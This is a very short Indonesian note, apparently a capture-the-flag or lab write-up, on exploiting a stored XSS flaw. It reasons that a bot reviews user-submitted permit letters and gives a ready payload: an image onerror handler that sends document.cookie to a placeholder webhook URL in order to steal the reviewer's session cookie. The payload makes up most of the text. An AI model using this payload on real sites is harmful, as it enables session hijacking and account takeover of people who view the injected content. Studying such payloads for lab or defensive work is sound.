1. recon awal web vuln stored xss
2. dengan mindset kalo ada seseorang yg mengakses surat izin yang dikirim user untuk direview (bot), maka eskalasi berikutnya adalah dengan mencuri cookie bot ini.
3. `<img src=x onerror="fetch('https:YOUR_WEBHOOK_URL?cookie='+document.cookie)" style="display:none">`